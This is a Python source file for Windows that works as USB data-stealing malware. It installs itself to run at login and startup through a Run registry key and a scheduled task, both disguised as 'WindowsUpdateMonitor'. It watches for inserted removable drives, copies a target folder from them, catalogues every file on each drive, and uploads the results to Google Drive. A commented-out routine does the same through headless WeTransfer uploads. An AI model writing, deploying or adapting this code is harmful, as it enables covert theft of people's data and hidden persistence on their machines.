import os
import psutil
import shutil
import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

# Install required packages if not already installed
def install_requirements():
    try:
        import selenium
    except ImportError:
        print("Installing Selenium for browser automation...")
        os.system('pip install selenium webdriver-manager')

import os
import sys
import winreg
import subprocess

import requests

# DROPBOX_ACCESS_TOKEN = "your_access_token_here"
# DROPBOX_UPLOAD_PATH = "/uploads/myfile.txt"  # Fixed file location
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import os

# Authenticate Google Drive API
SERVICE_ACCOUNT_FILE = "put your own ehre"  # Path to your downloaded JSON key
SCOPES = ["https://www.googleapis.com/auth/drive.file"]

def authenticate_drive():
    creds = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    return build("drive", "v3", credentials=creds)

# Upload file to Google Drive
def upload_to_google_drive(file_path, folder_id=None):
    drive_service = authenticate_drive()

    file_metadata = {"name": os.path.basename(file_path)}
    if folder_id:
        file_metadata["parents"] = [folder_id]  # Upload to specific Google Drive folder

    media = MediaFileUpload(file_path, resumable=True)

    file = drive_service.files().create(
        body=file_metadata, media_body=media, fields="id, webContentLink"
    ).execute()

    print(f"File uploaded successfully! Download Link: {file.get('webContentLink')}")
    return file.get("webContentLink")

# Example usage



def setup_persistence():
    script_path = os.path.abspath(sys.argv[0])
    task_name = "WindowsUpdateMonitor"

    
    python_path = sys.executable.replace("python.exe", "pythonw.exe")
    
    try:
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, task_name, 0, winreg.REG_SZ, f'"{python_path}" "{script_path}"')
        print(f"Login persistence added: {script_path} will run at user login.")
    except Exception as e:
        print(f"Error setting up login persistence: {e}")

    
    try:
        subprocess.run([
            "schtasks", "/create", "/sc", "onstart",
            "/tn", task_name, "/tr", f'"{python_path}" "{script_path}"',
            "/f"
        ], check=True)
        print(f"Startup persistence added: {script_path} will run at system startup.")
    except subprocess.CalledProcessError as e:
        print(f"Error setting up startup persistence: {e}")



def monitor_drives():
    known_drives = set(get_connected_drives())
    while True:
        time.sleep(5)
        current_drives = set(get_connected_drives())
        new_drives = current_drives - known_drives
        if new_drives:
            for drive in new_drives:
                handle_drive(drive)
        known_drives = current_drives


def get_connected_drives():
    return [disk.device for disk in psutil.disk_partitions() if 'removable' in disk.opts]


def handle_drive(drive):
    lol_folder = os.path.join(drive, "lol")
    if os.path.exists(lol_folder):
        copy_lol_folder(lol_folder)
        
    log_drive_contents(drive)


def copy_lol_folder(folder_path):
    dest_path = os.path.expanduser("~\\Desktop\\SystemUpdater")  # Log to Desktop
    os.makedirs(dest_path, exist_ok=True)
    dest_folder = os.path.join(dest_path, os.path.basename(folder_path))

   
    if os.path.exists(dest_folder):
        print(f"Folder {dest_folder} already exists. Deleting it...")
        shutil.rmtree(dest_folder)

    try:
        shutil.copytree(folder_path, dest_folder)

        
        if os.path.exists(dest_folder):
            log_message = f"Successfully copied {folder_path} to {dest_folder}."
            print(log_message)
            log_to_file(log_message)
        else:
            log_message = f"Failed to copy {folder_path} to {dest_folder}."
            print(log_message)
            log_to_file(log_message)
        upload_to_google_drive(os.path.expanduser("~\\Desktop\\SystemUpdater"))

    except Exception as e:
        log_message = f"Error during copying {folder_path}: {e}"
        print(log_message)
        log_to_file(log_message)


def log_to_file(message):
    log_file_path = os.path.expanduser("~\\Desktop\\copy_log.txt")
    with open(log_file_path, "a") as log_file:
        log_file.write(message + "\n")


def log_drive_contents(drive):
    log_file_path = os.path.expanduser("~\\Desktop\\SystemUpdater\\drive_log.txt")  # Log to Desktop
    with open(log_file_path, "a") as log:
        folders = []
        files = []
        for root, dirs, filenames in os.walk(drive):
            folders.extend([os.path.join(root, d) for d in dirs])
            files.extend([os.path.join(root, f) for f in filenames])
        files = sorted(files, key=lambda f: os.path.getsize(f), reverse=True)
        log.write(f"Drive: {drive}\n")
        log.write("Folders:\n" + "\n".join(folders) + "\n")
        log.write("Files:\n" + "\n".join(files) + "\n")

# def upload_to_wetransfer(folder_path):
#     # Initialize Selenium WebDriver
#     chrome_options = Options()
#     chrome_options.add_argument("--headless")  # Run in background without opening browser window
#     driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

#     try:
      
#         driver.get("https://wetransfer.com/")

        
#         time.sleep(3)

    
#         file_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
#         for root, dirs, files in os.walk(folder_path):
#             for file in files:
#                 file_path = os.path.join(root, file)
#                 file_input.send_keys(file_path)
#                 time.sleep(1) 

     
#         driver.find_element(By.XPATH, "//button[contains(text(),'Get a link')]").click()

       
#         time.sleep(10)

     
#         transfer_link = driver.find_element(By.CSS_SELECTOR, "input.copyable-link").get_attribute('value')
#         print(f"Transfer link: {transfer_link}")

#     except Exception as e:
#         print(f"Error uploading to WeTransfer: {e}")
#     finally:
#         driver.quit()

# Main function
def main():
    install_requirements() 
    setup_persistence()
    monitor_drives()

if __name__ == "__main__":
    main()
